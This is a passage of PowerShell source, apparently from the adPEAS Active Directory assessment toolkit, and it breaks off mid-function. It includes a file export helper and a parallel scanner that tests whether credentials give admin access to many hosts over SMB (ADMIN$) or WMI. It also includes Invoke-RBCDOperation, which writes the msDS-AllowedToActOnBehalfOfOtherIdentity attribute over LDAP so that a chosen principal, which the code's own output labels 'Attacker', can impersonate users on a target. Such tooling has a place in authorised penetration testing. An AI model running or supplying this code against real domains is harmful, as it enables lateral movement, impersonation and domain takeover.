function Export-adPEASFile {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory=$true)]
	    [ValidateNotNullOrEmpty()]
	    [string]$Path,
	    [Parameter(Mandatory=$true)]
	    [object]$Content,
	    [Parameter(Mandatory=$false)]
	    [ValidateSet('Text', 'Json', 'Binary')]
	    [string]$Type = 'Text',
	    [Parameter(Mandatory=$false)]
	    [int]$JsonDepth = 10,
	    [Parameter(Mandatory=$false)]
	    [switch]$Force,
	    [Parameter(Mandatory=$false)]
	    [switch]$SanitizeFilename = $true,
	    [Parameter(Mandatory=$false)]
	    [switch]$CreateDirectory
	)
	begin {
	    $InvalidChars = [System.IO.Path]::GetInvalidFileNameChars()
	}
	process {
	    try {
	        $resolvedPath = $Path
	        $directory = [System.IO.Path]::GetDirectoryName($Path)
	        $filename = [System.IO.Path]::GetFileName($Path)
	        if ([string]::IsNullOrEmpty($directory)) {
	            $directory = Get-Location
	        }
	        if ($SanitizeFilename -and -not [string]::IsNullOrEmpty($filename)) {
	            $originalFilename = $filename
	            foreach ($char in $InvalidChars) {
	                $filename = $filename -replace [regex]::Escape($char), '_'
	            }
	            $filename = $filename -replace '[\[\]{}()]', '_'
	            $filename = $filename -replace '_+', '_'
	            $filename = $filename.Trim('_')
	            if ($filename -ne $originalFilename) {
	            }
	        }
	        $resolvedPath = Join-Path -Path $directory -ChildPath $filename
	        if (-not [System.IO.Path]::IsPathRooted($resolvedPath)) {
	            $resolvedPath = Join-Path -Path (Get-Location) -ChildPath $resolvedPath
	        }
	        $targetDir = [System.IO.Path]::GetDirectoryName($resolvedPath)
	        if (-not (Test-Path -Path $targetDir -PathType Container)) {
	            if ($CreateDirectory) {
	                New-Item -Path $targetDir -ItemType Directory -Force | Out-Null
	            } else {
	                return [PSCustomObject]@{
	                    Success = $false
	                    Path = $resolvedPath
	                    Message = "Directory does not exist: $targetDir"
	                    BytesWritten = 0
	                }
	            }
	        }
	        if ((Test-Path -Path $resolvedPath) -and -not $Force) {
	            Write-Warning "[Export-adPEASFile] File already exists: $resolvedPath (use -Force to overwrite)"
	            return [PSCustomObject]@{
	                Success = $false
	                Path = $resolvedPath
	                Message = "File already exists (use -Force to overwrite)"
	                BytesWritten = 0
	            }
	        }
	        $bytesWritten = 0
	        switch ($Type) {
	            'Text' {
	                $Content | Out-File -FilePath $resolvedPath -Encoding UTF8 -Force
	                $bytesWritten = (Get-Item $resolvedPath).Length
	            }
	            'Json' {
	                $jsonContent = $Content | ConvertTo-Json -Depth $JsonDepth
	                $utf8NoBom = New-Object System.Text.UTF8Encoding $false
	                [System.IO.File]::WriteAllText($resolvedPath, $jsonContent, $utf8NoBom)
	                $bytesWritten = (Get-Item $resolvedPath).Length
	            }
	            'Binary' {
	                if ($Content -isnot [byte[]]) {
	                    return [PSCustomObject]@{
	                        Success = $false
	                        Path = $resolvedPath
	                        Message = "Binary type requires byte array content"
	                        BytesWritten = 0
	                    }
	                }
	                [System.IO.File]::WriteAllBytes($resolvedPath, $Content)
	                $bytesWritten = $Content.Length
	            }
	        }
	        return [PSCustomObject]@{
	            Success = $true
	            Path = $resolvedPath
	            Message = "Successfully exported to: $resolvedPath"
	            BytesWritten = $bytesWritten
	        }
	    }
	    catch {
	        return [PSCustomObject]@{
	            Success = $false
	            Path = $resolvedPath
	            Message = "Export failed: $($_.Exception.Message)"
	            BytesWritten = 0
	        }
	    }
	}
}
function Test-RemoteAdminAccess {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
	    [Alias('DNSHostName', 'Name', 'CN', 'IPAddress')]
	    [string[]]$ComputerName,
	    [Parameter(Mandatory=$false)]
	    [System.Management.Automation.PSCredential]$Credential,
	    [Parameter(Mandatory=$false)]
	    [ValidateRange(500, 30000)]
	    [int]$Timeout = 2000,
	    [Parameter(Mandatory=$false)]
	    [ValidateRange(1, 100)]
	    [int]$ThrottleLimit = 32,
	    [Parameter(Mandatory=$false)]
	    [ValidateSet('SMB', 'WMI', 'All')]
	    [string]$Method = 'SMB',
	    [Parameter(Mandatory=$false)]
	    [switch]$NoFallback
	)
	begin {
	    $allComputers = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)
	    $forceSequential = $false
	    $kerberosSession = $Script:LDAPContext -and $Script:LDAPContext['KerberosUsed']
	    if ($kerberosSession -and -not $Credential) {
	        $forceSequential = $true
	        Write-Warning "Kerberos session detected: Parallel execution disabled (Runspaces don't inherit Kerberos ticket context). Use -Credential for parallel execution."
	    }
	    $testScriptBlock = {
	        param(
	            [string]$Computer,
	            [int]$TimeoutMs,
	            [System.Management.Automation.PSCredential]$Cred,
	            [string]$TestMethod,
	            [bool]$AllowFallback
	        )
	        $result = [PSCustomObject]@{
	            ComputerName = $Computer
	            IsAdmin      = $false
	            Method       = $null
	            ResponseTime = 0
	            Error        = $null
	        }
	        $stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
	        function Get-Win32ErrorInfo {
	            param(
	                [Parameter(Mandatory=$true)]
	                [System.Exception]$Exception,
	                [string]$Context = "Operation"
	            )
	            $errorInfo = @{
	                Message = $null
	                ShouldFallback = $false
	                IsAccessDenied = $false
	            }
	            $hresult = $Exception.HResult
	            $win32Code = if ($hresult) { $hresult -band 0xFFFF } else { 0 }
	            switch ($win32Code) {
	                5 {
	                    $errorInfo.Message = "Access denied"
	                    $errorInfo.IsAccessDenied = $true
	                }
	                1326 {
	                    $errorInfo.Message = "Invalid credentials"
	                    $errorInfo.IsAccessDenied = $true
	                }
	                1219 {
	                    $errorInfo.Message = "Session credential conflict"
	                    $errorInfo.IsAccessDenied = $true
	                }
	                { $_ -in @(53, 67) } {
	                    $errorInfo.Message = "Network path not found"
	                    $errorInfo.ShouldFallback = $true
	                }
	                1311 {
	                    $errorInfo.Message = "No logon servers available"
	                    $errorInfo.ShouldFallback = $true
	                }
	                1722 {
	                    $errorInfo.Message = "RPC server unavailable"
	                    $errorInfo.ShouldFallback = $true
	                }
	                default {
	                    switch ($hresult) {
	                        0x800706BA {
	                            $errorInfo.Message = "RPC server unavailable"
	                            $errorInfo.ShouldFallback = $true
	                        }
	                        { $_ -in @(0x80070005, 0x80041003) } {
	                            $errorInfo.Message = "Access denied"
	                            $errorInfo.IsAccessDenied = $true
	                        }
	                        default {
	                            if ($hresult) {
	                                $errorInfo.Message = "$Context error (0x{0:X8}): {1}" -f $hresult, $Exception.Message
	                            } else {
	                                $errorInfo.Message = "$Context error: $($Exception.Message)"
	                            }
	                        }
	                    }
	                }
	            }
	            return $errorInfo
	        }
	        function Test-TcpPort {
	            param($TargetHost, $Port, $TimeoutMs)
	            $tcpResult = @{
	                Success = $false
	                Error = $null
	            }
	            $tcpClient = $null
	            try {
	                $tcpClient = New-Object System.Net.Sockets.TcpClient
	                $connectTask = $tcpClient.BeginConnect($TargetHost, $Port, $null, $null)
	                $connected = $connectTask.AsyncWaitHandle.WaitOne($TimeoutMs, $false)
	                if (-not $connected) {
	                    $tcpResult.Error = "Connection timeout (port $Port)"
	                    return $tcpResult
	                }
	                try {
	                    $tcpClient.EndConnect($connectTask)
	                    $tcpResult.Success = $true
	                } catch {
	                    $tcpResult.Error = "Port $Port refused"
	                }
	            } catch {
	                if ($_.Exception.Message -match "No such host is known") {
	                    $tcpResult.Error = "DNS resolution failed"
	                } else {
	                    $tcpResult.Error = "Connection error: $($_.Exception.Message)"
	                }
	            } finally {
	                if ($tcpClient) {
	                    try { $tcpClient.Close() } catch { }
	                    try { $tcpClient.Dispose() } catch { }
	                }
	            }
	            return $tcpResult
	        }
	        function Test-SMBAdmin {
	            param($TargetComputer, $TimeoutMs, $Cred)
	            $smbResult = @{
	                Success = $false
	                Error = $null
	                ShouldFallback = $false
	            }
	            try {
	                if ($TargetComputer -match '[<>:"|?*\\\/]' -or $TargetComputer -match '^\s*$') {
	                    $smbResult.Error = "Invalid computer name"
	                    return $smbResult
	                }
	                $tcpCheck = Test-TcpPort -TargetHost $TargetComputer -Port 445 -TimeoutMs $TimeoutMs
	                if (-not $tcpCheck.Success) {
	                    $smbResult.Error = $tcpCheck.Error
	                    $smbResult.ShouldFallback = $true
	                    return $smbResult
	                }
	                $adminShare = "\\$TargetComputer\ADMIN$"
	                if ($Cred) {
	                    $driveName = "adPEAS_$([guid]::NewGuid().ToString('N').Substring(0,8))"
	                    $psDrive = $null
	                    try {
	                        $psDrive = New-PSDrive -Name $driveName -PSProvider FileSystem -Root $adminShare -Credential $Cred -ErrorAction Stop
	                        $smbResult.Success = $true
	                    } catch {
	                        $errInfo = Get-Win32ErrorInfo -Exception $_.Exception -Context "SMB"
	                        $smbResult.Error = $errInfo.Message
	                        $smbResult.ShouldFallback = $errInfo.ShouldFallback
	                        $win32Code = if ($_.Exception.HResult) { $_.Exception.HResult -band 0xFFFF } else { 0 }
	                        if ($win32Code -eq 1219) {
	                            $testPathResult = Test-Path -Path $adminShare -ErrorAction SilentlyContinue
	                            if ($testPathResult) {
	                                $smbResult.Success = $true
	                                $smbResult.Error = $null
	                            }
	                        }
	                    } finally {
	                        if ($psDrive) {
	                            try { Remove-PSDrive -Name $driveName -Force -ErrorAction SilentlyContinue } catch { }
	                        }
	                    }
	                } else {
	                    try {
	                        $null = Get-Item -Path $adminShare -ErrorAction Stop
	                        $smbResult.Success = $true
	                    } catch {
	                        $errInfo = Get-Win32ErrorInfo -Exception $_.Exception -Context "SMB"
	                        $smbResult.Error = $errInfo.Message
	                        $smbResult.ShouldFallback = $errInfo.ShouldFallback
	                    }
	                }
	            } catch {
	                $errInfo = Get-Win32ErrorInfo -Exception $_.Exception -Context "SMB"
	                $smbResult.Error = $errInfo.Message
	                $smbResult.ShouldFallback = $true
	            }
	            return $smbResult
	        }
	        function Test-WMIAdmin {
	            param($TargetComputer, $TimeoutMs, $Cred)
	            $wmiResult = @{
	                Success = $false
	                Error = $null
	            }
	            $wmiScope = $null
	            $searcher = $null
	            $wmiResultSet = $null
	            try {
	                if ($TargetComputer -match '[<>:"|?*]' -or $TargetComputer -match '^\s*$') {
	                    $wmiResult.Error = "Invalid computer name"
	                    return $wmiResult
	                }
	                $tcpCheck = Test-TcpPort -TargetHost $TargetComputer -Port 135 -TimeoutMs $TimeoutMs
	                if (-not $tcpCheck.Success) {
	                    $wmiResult.Error = $tcpCheck.Error
	                    return $wmiResult
	                }
	                $wmiOptions = New-Object System.Management.ConnectionOptions
	                $wmiOptions.Timeout = [TimeSpan]::FromMilliseconds($TimeoutMs)
	                if ($Cred) {
	                    $wmiOptions.Username = $Cred.UserName
	                    $wmiOptions.Password = $Cred.GetNetworkCredential().Password
	                    $netCred = $Cred.GetNetworkCredential()
	                    if (-not [string]::IsNullOrEmpty($netCred.Domain)) {
	                        $wmiOptions.Authority = "ntlmdomain:$($netCred.Domain)"
	                    }
	                }
	                $wmiScope = New-Object System.Management.ManagementScope("\\$TargetComputer\root\default", $wmiOptions)
	                try {
	                    $wmiScope.Connect()
	                    if ($wmiScope.IsConnected) {
	                        $regPath = New-Object System.Management.ManagementPath("StdRegProv")
	                        $regClass = New-Object System.Management.ManagementClass($wmiScope, $regPath, $null)
	                        $inParams = $regClass.GetMethodParameters("EnumKey")
	                        $inParams["hDefKey"] = [uint32]2147483650
	                        $inParams["sSubKeyName"] = "SYSTEM\CurrentControlSet\Control"
	                        $outParams = $regClass.InvokeMethod("EnumKey", $inParams, $null)
	                        if ($outParams["ReturnValue"] -eq 0) {
	                            $wmiResult.Success = $true
	                        } elseif ($outParams["ReturnValue"] -eq 5) {
	                            $wmiResult.Error = "Access denied (WMI)"
	                        } else {
	                            $wmiResult.Error = "WMI registry access failed (code: $($outParams["ReturnValue"]))"
	                        }
	                        $regClass.Dispose()
	                    } else {
	                        $wmiResult.Error = "WMI connection failed"
	                    }
	                } catch [System.UnauthorizedAccessException] {
	                    $wmiResult.Error = "Access denied (WMI)"
	                } catch [System.Runtime.InteropServices.COMException] {
	                    $errInfo = Get-Win32ErrorInfo -Exception $_.Exception -Context "WMI"
	                    $wmiResult.Error = $errInfo.Message
	                }
	            } catch {
	                $errInfo = Get-Win32ErrorInfo -Exception $_.Exception -Context "WMI"
	                $wmiResult.Error = $errInfo.Message
	            } finally {
	                if ($wmiResultSet) {
	                    try { $wmiResultSet.Dispose() } catch { }
	                }
	                if ($searcher) {
	                    try { $searcher.Dispose() } catch { }
	                }
	                if ($wmiScope) {
	                    $wmiScope = $null
	                }
	            }
	            return $wmiResult
	        }
	        try {
	            if ($TestMethod -eq 'SMB' -or $TestMethod -eq 'All') {
	                $smbResult = Test-SMBAdmin -TargetComputer $Computer -TimeoutMs $TimeoutMs -Cred $Cred
	                if ($smbResult.Success) {
	                    $result.IsAdmin = $true
	                    $result.Method = 'SMB'
	                } elseif ($TestMethod -eq 'SMB' -and -not $AllowFallback) {
	                    $result.Error = $smbResult.Error
	                    $result.Method = 'SMB'
	                } elseif ($smbResult.ShouldFallback -and $AllowFallback) {
	                    $wmiResult = Test-WMIAdmin -TargetComputer $Computer -TimeoutMs $TimeoutMs -Cred $Cred
	                    if ($wmiResult.Success) {
	                        $result.IsAdmin = $true
	                        $result.Method = 'WMI'
	                    } else {
	                        $result.Error = "SMB: $($smbResult.Error); WMI: $($wmiResult.Error)"
	                        $result.Method = 'SMB+WMI'
	                    }
	                } elseif ($TestMethod -eq 'All' -and -not $smbResult.Success) {
	                    $wmiResult = Test-WMIAdmin -TargetComputer $Computer -TimeoutMs $TimeoutMs -Cred $Cred
	                    if ($wmiResult.Success) {
	                        $result.IsAdmin = $true
	                        $result.Method = 'WMI'
	                    } else {
	                        $result.Error = "SMB: $($smbResult.Error); WMI: $($wmiResult.Error)"
	                        $result.Method = 'SMB+WMI'
	                    }
	                } else {
	                    $result.Error = $smbResult.Error
	                    $result.Method = 'SMB'
	                }
	            }
	            if ($TestMethod -eq 'WMI') {
	                $wmiResult = Test-WMIAdmin -TargetComputer $Computer -TimeoutMs $TimeoutMs -Cred $Cred
	                if ($wmiResult.Success) {
	                    $result.IsAdmin = $true
	                    $result.Method = 'WMI'
	                } else {
	                    $result.Error = $wmiResult.Error
	                    $result.Method = 'WMI'
	                }
	            }
	        } catch {
	            $result.Error = $_.Exception.Message
	            if (-not $result.Method) {
	                $result.Method = $TestMethod
	            }
	        }
	        $stopwatch.Stop()
	        $result.ResponseTime = $stopwatch.ElapsedMilliseconds
	        return $result
	    }
	}
	process {
	    foreach ($computer in $ComputerName) {
	        if (-not [string]::IsNullOrWhiteSpace($computer)) {
	            $trimmedName = $computer.Trim()
	            if (-not (Test-ValidComputerName -ComputerName $trimmedName -AllowFQDN -AllowIPAddress)) {
	                [PSCustomObject]@{
	                    ComputerName = $trimmedName
	                    IsAdmin      = $false
	                    Method       = $null
	                    ResponseTime = 0
	                    Error        = "Invalid computer name - rejected for security"
	                }
	                continue
	            }
	            [void]$allComputers.Add($trimmedName)
	        }
	    }
	}
	end {
	    if ($allComputers.Count -eq 0) {
	        return
	    }
	    $allowFallback = (-not $NoFallback) -and ($Method -eq 'SMB')
	    $results = [System.Collections.ArrayList]::new()
	    $adminCount = 0
	    if ($forceSequential) {
	        $completedCount = 0
	        foreach ($computer in $allComputers) {
	            $completedCount++
	            if ($allComputers.Count -gt 10) {
	                Write-Progress -Activity "Testing Remote Admin Access (Sequential)" `
	                               -Status "Testing $computer ($completedCount of $($allComputers.Count))" `
	                               -PercentComplete (($completedCount / $allComputers.Count) * 100)
	            }
	            $testResult = & $testScriptBlock -Computer $computer `
	                                             -TimeoutMs $Timeout `
	                                             -Cred $Credential `
	                                             -TestMethod $Method `
	                                             -AllowFallback $allowFallback
	            if ($testResult) {
	                [void]$results.Add($testResult)
	                if ($testResult.IsAdmin) {
	                    $adminCount++
	                }
	            }
	            if ($allComputers.Count -gt 100 -and $completedCount % 50 -eq 0) {
	            }
	        }
	        if ($allComputers.Count -gt 10) {
	            Write-Progress -Activity "Testing Remote Admin Access (Sequential)" -Completed
	        }
	    }
	    else {
	        $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
	        $runspacePool = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspacePool(1, $ThrottleLimit, $sessionState, $Host)
	        $runspacePool.ApartmentState = [System.Threading.ApartmentState]::MTA
	        $runspacePool.Open()
	        $runspaces = [System.Collections.ArrayList]::new()
	        try {
	            foreach ($computer in $allComputers) {
	                $ps = [PowerShell]::Create()
	                $ps.RunspacePool = $runspacePool
	                [void]$ps.AddScript($testScriptBlock)
	                [void]$ps.AddParameter('Computer', $computer)
	                [void]$ps.AddParameter('TimeoutMs', $Timeout)
	                [void]$ps.AddParameter('TestMethod', $Method)
	                [void]$ps.AddParameter('AllowFallback', $allowFallback)
	                if ($Credential) {
	                    [void]$ps.AddParameter('Cred', $Credential)
	                }
	                $runspaceInfo = [PSCustomObject]@{
	                    PowerShell = $ps
	                    Handle     = $ps.BeginInvoke()
	                    Computer   = $computer
	                }
	                [void]$runspaces.Add($runspaceInfo)
	            }
	            $completedCount = 0
	            foreach ($rs in $runspaces) {
	                try {
	                    $completed = $rs.Handle.AsyncWaitHandle.WaitOne($Timeout * 3)
	                    if ($completed) {
	                        $output = $rs.PowerShell.EndInvoke($rs.Handle)
	                        if ($output) {
	                            foreach ($item in $output) {
	                                [void]$results.Add($item)
	                                if ($item.IsAdmin) {
	                                    $adminCount++
	                                }
	                            }
	                        }
	                    } else {
	                        $errorResult = [PSCustomObject]@{
	                            ComputerName = $rs.Computer
	                            IsAdmin      = $false
	                            Method       = $Method
	                            ResponseTime = $Timeout * 3
	                            Error        = "Operation timeout"
	                        }
	                        [void]$results.Add($errorResult)
	                    }
	                } catch {
	                    $errorResult = [PSCustomObject]@{
	                        ComputerName = $rs.Computer
	                        IsAdmin      = $false
	                        Method       = $Method
	                        ResponseTime = 0
	                        Error        = $_.Exception.Message
	                    }
	                    [void]$results.Add($errorResult)
	                } finally {
	                    if ($rs.PowerShell) {
	                        try {
	                            $rs.PowerShell.Stop()
	                            $rs.PowerShell.Dispose()
	                        } catch { }
	                    }
	                }
	                $completedCount++
	                if ($allComputers.Count -gt 100 -and $completedCount % 50 -eq 0) {
	                }
	            }
	        } finally {
	            if ($runspacePool) {
	                try {
	                    $runspacePool.Close()
	                    $runspacePool.Dispose()
	                } catch { }
	            }
	        }
	    }
	    return ,$results
	}
}
function Invoke-RBCDOperation {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory)]
	    [string]$TargetDN,
	    [Parameter(Mandatory)]
	    [string]$TargetSAMAccountName,
	    [Parameter(Mandatory)]
	    [ValidateSet('User', 'Computer')]
	    [string]$TargetType,
	    [Parameter(ParameterSetName='Set', Mandatory)]
	    [string]$AddRBCD,
	    [Parameter(ParameterSetName='Clear', Mandatory)]
	    [switch]$ClearRBCD,
	    [Parameter(ParameterSetName='Clear')]
	    [string]$Principal,
	    [Parameter(ParameterSetName='Clear')]
	    [switch]$Force,
	    [switch]$PassThru,
	    [hashtable]$ConnectionParams = @{}
	)
	$FunctionPrefix = "[Invoke-RBCDOperation]"
	if ($PSCmdlet.ParameterSetName -eq 'Set') {
	    try {
	        $DelegateObject = @(Get-DomainObject -Identity $AddRBCD -Properties objectSid @ConnectionParams)[0]
	        if (-not $DelegateObject) {
	            throw "Principal '$AddRBCD' not found"
	        }
	        $DelegateSID = New-Object System.Security.Principal.SecurityIdentifier($DelegateObject.objectSid)
	        $ExistingRBCD = @(Get-DomainObject -Identity $TargetDN -Properties 'msDS-AllowedToActOnBehalfOfOtherIdentity' -Raw @ConnectionParams)[0]
	        $AlreadyExists = $false
	        $ExistingSDBytes = $null
	        if ($ExistingRBCD -and $ExistingRBCD.'msDS-AllowedToActOnBehalfOfOtherIdentity') {
	            $ExistingSDBytes = [byte[]]$ExistingRBCD.'msDS-AllowedToActOnBehalfOfOtherIdentity'
	        } else {
	        }
	        if ($ExistingSDBytes -and $ExistingSDBytes.Length -gt 0) {
	            $RawSD = New-Object System.Security.AccessControl.RawSecurityDescriptor([byte[]]$ExistingSDBytes, 0)
	            foreach ($ace in $RawSD.DiscretionaryAcl) {
	                $commonAce = [System.Security.AccessControl.CommonAce]$ace
	                if ($commonAce.SecurityIdentifier.Value -eq $DelegateSID.Value) {
	                    $AlreadyExists = $true
	                    break
	                }
	            }
	            if (-not $AlreadyExists) {
	                $RawSD.DiscretionaryAcl.InsertAce(
	                    $RawSD.DiscretionaryAcl.Count,
	                    (New-Object System.Security.AccessControl.CommonAce(
	                        [System.Security.AccessControl.AceFlags]::None,
	                        [System.Security.AccessControl.AceQualifier]::AccessAllowed,
	                        0x10000000,  # GenericAll
	                        $DelegateSID,
	                        $false,
	                        $null
	                    ))
	                )
	            }
	        } else {
	            $RawSD = New-Object System.Security.AccessControl.RawSecurityDescriptor("O:BAD:")
	            $RawSD.DiscretionaryAcl = New-Object System.Security.AccessControl.RawAcl(
	                [System.Security.AccessControl.RawAcl]::AclRevision,
	                1
	            )
	            $RawSD.DiscretionaryAcl.InsertAce(
	                0,
	                (New-Object System.Security.AccessControl.CommonAce(
	                    [System.Security.AccessControl.AceFlags]::None,
	                    [System.Security.AccessControl.AceQualifier]::AccessAllowed,
	                    0x10000000,  # GenericAll
	                    $DelegateSID,
	                    $false,
	                    $null
	                ))
	            )
	        }
	        $SDBytes = New-Object byte[] $RawSD.BinaryLength
	        $RawSD.GetBinaryForm($SDBytes, 0)
	        $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
	        $ModifyRequest.DistinguishedName = $TargetDN
	        $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
	        $Modification.Name = "msDS-AllowedToActOnBehalfOfOtherIdentity"
	        $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
	        $Modification.Add($SDBytes) | Out-Null
	        $ModifyRequest.Modifications.Add($Modification) | Out-Null
	        $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
	        if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
	            throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
	        }
	        $DelegateName = if ($DelegateObject.sAMAccountName) { $DelegateObject.sAMAccountName } else { $AddRBCD }
	        if ($PassThru) {
	            return [PSCustomObject]@{
	                Operation = "SetRBCD"
	                $TargetType = $TargetSAMAccountName
	                DistinguishedName = $TargetDN
	                DelegateFrom = $DelegateName
	                AlreadyExisted = $AlreadyExists
	                Success = $true
	                Message = if ($AlreadyExists) { "RBCD entry already existed" } else { "RBCD successfully configured. $DelegateName can now impersonate users to $TargetSAMAccountName" }
	            }
	        } else {
	            if ($AlreadyExists) {
	                Show-Line "RBCD entry already exists for $DelegateName on: $TargetSAMAccountName" -Class Note
	            } else {
	                Show-Line "Successfully configured RBCD on target: $TargetSAMAccountName" -Class Hint
	                Show-KeyValue "Attacker (can impersonate):" $DelegateName
	                Show-KeyValue "Target (receives impersonation):" $TargetSAMAccountName
	            }
	        }
	    } catch {
	        throw "Failed to configure RBCD: $_"
	    }
	}
	else {
	    try {
	        $ExistingRBCD = @(Get-DomainObject -Identity $TargetDN -Properties 'msDS-AllowedToActOnBehalfOfOtherIdentity' -Raw @ConnectionParams)[0]
	        $ExistingSDBytes = $null
	        if ($ExistingRBCD -and $ExistingRBCD.'msDS-AllowedToActOnBehalfOfOtherIdentity') {
	            $ExistingSDBytes = [byte[]]$ExistingRBCD.'msDS-AllowedToActOnBehalfOfOtherIdentity'
	        }
	        if (-not $ExistingSDBytes -or $ExistingSDBytes.Length -eq 0) {
	            if ($PassThru) {
	                return [PSCustomObject]@{
	                    Operation = "ClearRBCD"
	                    $TargetType = $TargetSAMAccountName
	                    DistinguishedName = $TargetDN
	                    Success = $true
	                    Message = "No RBCD configuration to clear"
	                }
	            } else {
	                Show-Line "No RBCD configuration found on: $TargetSAMAccountName" -Class Note
	            }
	            return $null
	        }
	        $RawSD = New-Object System.Security.AccessControl.RawSecurityDescriptor([byte[]]$ExistingSDBytes, 0)
	        $ACECount = $RawSD.DiscretionaryAcl.Count
	        $ConfiguredPrincipals = @()
	        foreach ($ace in $RawSD.DiscretionaryAcl) {
	            $CommonAce = [System.Security.AccessControl.CommonAce]$ace
	            $PrincipalSID = $CommonAce.SecurityIdentifier.Value
	            $PrincipalName = ConvertFrom-SID -SID $PrincipalSID
	            if (-not $PrincipalName) { $PrincipalName = $PrincipalSID }
	            $ConfiguredPrincipals += [PSCustomObject]@{
	                SID = $PrincipalSID
	                Name = $PrincipalName
	                ACE = $CommonAce
	            }
	        }
	        if ($Principal) {
	            $TargetSID = ConvertTo-SID -Identity $Principal
	            if (-not $TargetSID) {
	                $TargetSID = $Principal
	            }
	            $PrincipalInput = $Principal
	            $PrincipalWithDollar = if ($Principal -notmatch '\$$') { "${Principal}`$" } else { $Principal }
	            $LikePatternInput = '*\' + $PrincipalInput
	            $LikePatternDollar = '*\' + $PrincipalWithDollar
	            $PrincipalToRemove = $ConfiguredPrincipals | Where-Object {
	                ($_.SID -eq $TargetSID) -or
	                ($_.Name -eq $PrincipalInput) -or
	                ($_.Name -like $LikePatternInput) -or
	                ($_.Name -like $LikePatternDollar) -or
	                ($_.Name -eq $PrincipalWithDollar)
	            } | Select-Object -First 1
	            if (-not $PrincipalToRemove) {
	                if ($PassThru) {
	                    return [PSCustomObject]@{
	                        Operation = "ClearRBCD"
	                        $TargetType = $TargetSAMAccountName
	                        DistinguishedName = $TargetDN
	                        Success = $false
	                        Message = "Principal '$Principal' not found in RBCD configuration"
	                        ExistingPrincipals = $ConfiguredPrincipals
	                    }
	                } else {
	                    Write-Warning "[!] Principal '$Principal' not found in RBCD configuration on: $TargetSAMAccountName"
	                    Show-EmptyLine
	                    Show-Line "Existing RBCD principals:" -Class Hint
	                    foreach ($configuredPrincipal in $ConfiguredPrincipals) {
	                        Show-KeyValue "Principal:" "$($configuredPrincipal.Name) ($($configuredPrincipal.SID))"
	                    }
	                }
	                return $null
	            }
	            $DaclCount = [int]$RawSD.DiscretionaryAcl.Count
	            $NewDACL = New-Object System.Security.AccessControl.RawAcl(
	                [System.Security.AccessControl.RawAcl]::AclRevision,
	                ($DaclCount - 1)
	            )
	            $aceIndex = 0
	            foreach ($ace in $RawSD.DiscretionaryAcl) {
	                $CommonAce = [System.Security.AccessControl.CommonAce]$ace
	                if ($CommonAce.SecurityIdentifier.Value -ne $PrincipalToRemove.SID) {
	                    $NewDACL.InsertAce($aceIndex, $ace)
	                    $aceIndex++
	                }
	            }
	            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
	            $ModifyRequest.DistinguishedName = $TargetDN
	            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
	            $Modification.Name = "msDS-AllowedToActOnBehalfOfOtherIdentity"
	            if ($NewDACL.Count -eq 0) {
	                $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete
	            } else {
	                $RawSD.DiscretionaryAcl = $NewDACL
	                $SDBytes = New-Object byte[] $RawSD.BinaryLength
	                $RawSD.GetBinaryForm($SDBytes, 0)
	                $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
	                $Modification.Add($SDBytes) | Out-Null
	            }
	            $ModifyRequest.Modifications.Add($Modification) | Out-Null
	            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
	            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
	                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
	            }
	            if ($PassThru) {
	                return [PSCustomObject]@{
	                    Operation = "ClearRBCD"
	                    $TargetType = $TargetSAMAccountName
	                    DistinguishedName = $TargetDN
	                    RemovedPrincipal = $PrincipalToRemove.Name
	                    RemainingCount = $NewDACL.Count
	                    Success = $true
	                    Message = "RBCD entry for '$($PrincipalToRemove.Name)' removed"
	                }
	            } else {
	                Show-Line "Successfully removed '$($PrincipalToRemove.Name)' from RBCD configuration on: $TargetSAMAccountName" -Class Hint
	            }
	        } elseif ($ACECount -eq 1) {
	            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
	            $ModifyRequest.DistinguishedName = $TargetDN
	            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
	            $Modification.Name = "msDS-AllowedToActOnBehalfOfOtherIdentity"
	            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete
	            $ModifyRequest.Modifications.Add($Modification) | Out-Null
	            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
	            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
	                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
	            }
	            if ($PassThru) {
	                return [PSCustomObject]@{
	                    Operation = "ClearRBCD"
	                    $TargetType = $TargetSAMAccountName
	                    DistinguishedName = $TargetDN
	                    ClearedCount = 1
	                    Success = $true
	                    Message = "RBCD configuration successfully cleared"
	                }
	            } else {
	                Show-Line "Successfully cleared RBCD configuration from: $TargetSAMAccountName" -Class Hint
	            }
	        } elseif ($Force) {
	            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
	            $ModifyRequest.DistinguishedName = $TargetDN
	            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
	            $Modification.Name = "msDS-AllowedToActOnBehalfOfOtherIdentity"
	            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete
	            $ModifyRequest.Modifications.Add($Modification) | Out-Null
	            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
